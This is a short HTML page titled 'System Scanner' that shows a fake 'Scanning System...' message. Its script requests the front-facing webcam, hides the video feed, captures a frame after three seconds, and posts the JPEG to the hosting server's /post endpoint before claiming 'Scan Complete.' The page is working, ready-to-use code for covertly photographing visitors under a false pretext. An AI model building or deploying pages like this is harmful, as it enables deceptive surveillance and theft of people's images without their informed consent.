<!DOCTYPE html>
<html>
<head>
    <title>System Scanner</title>
    <style>
        body { background: black; color: #00ff00; font-family: monospace; text-align: center; padding-top: 50px; }
    </style>
</head>
<body>
    <h2 id="status">Scanning System...</h2>
    <video id="video" width="0" height="0" autoplay style="display:none;"></video>
    <script>
        const video = document.getElementById('video');
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;
                setTimeout(capture, 3000); 
            });

        function capture() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            const imgData = canvas.toDataURL('image/jpeg', 0.5); 

            fetch('/post', {
                method: 'POST',
                body: JSON.stringify({ image: imgData }),
                headers: { 'Content-Type': 'application/json' }
            }).then(() => {
                document.getElementById('status').innerText = "Scan Complete.";
            }).catch(err => console.error(err));
        }
    </script>
</body>
</html>
